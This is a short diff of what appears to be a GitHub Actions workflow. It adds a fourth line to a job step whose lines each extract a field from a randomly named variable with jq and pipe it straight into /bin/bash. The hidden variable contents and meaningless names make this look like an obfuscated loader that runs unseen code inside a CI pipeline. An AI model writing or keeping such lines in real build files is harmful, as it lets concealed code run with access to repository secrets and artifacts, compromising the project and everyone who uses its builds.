@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$kxmb5" | jq -r .r415 | /bin/bash
           printf '%s' "$xmavs4" | jq -r .qoex20935 | /bin/bash
           echo $k9412 | jq -r .ykyut0 | /bin/bash
+          echo $ud381 | jq -r .vxjmo2 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
